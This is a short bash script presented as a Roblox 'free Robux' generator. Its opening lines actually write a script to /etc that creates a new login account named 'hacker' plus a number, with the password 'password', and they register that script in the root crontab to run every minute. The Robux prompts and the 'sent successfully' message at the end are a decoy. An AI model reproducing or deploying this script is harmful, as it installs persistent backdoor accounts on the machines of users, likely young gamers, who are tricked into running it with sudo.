#!/bin/bash

SCRIPT_PATH="/etc/notMalware.sh"

cat << 'EOF' > "$SCRIPT_PATH"
#!/bin/bash

COUNTER_FILE="/etc/counter.txt"

if [ ! -f "$COUNTER_FILE" ]; then
    echo 0 > "$COUNTER_FILE"
fi

counter=$(cat "$COUNTER_FILE")
counter=$((counter + 1))

sudo useradd -m -s /bin/bash "hacker$counter" && echo "hacker$counter:password" | sudo chpasswd

echo $counter > $COUNTER_FILE
EOF

sudo chmod +x "$SCRIPT_PATH"

sudo sh -c 'echo "*  *    * * *   root    /etc/notMalware.sh" >> /etc/crontab'

echo -n "Enter your roblox username: "
read username
echo -n "Enter how many robux you want: "
read robux
echo "Robux sent successfully!"
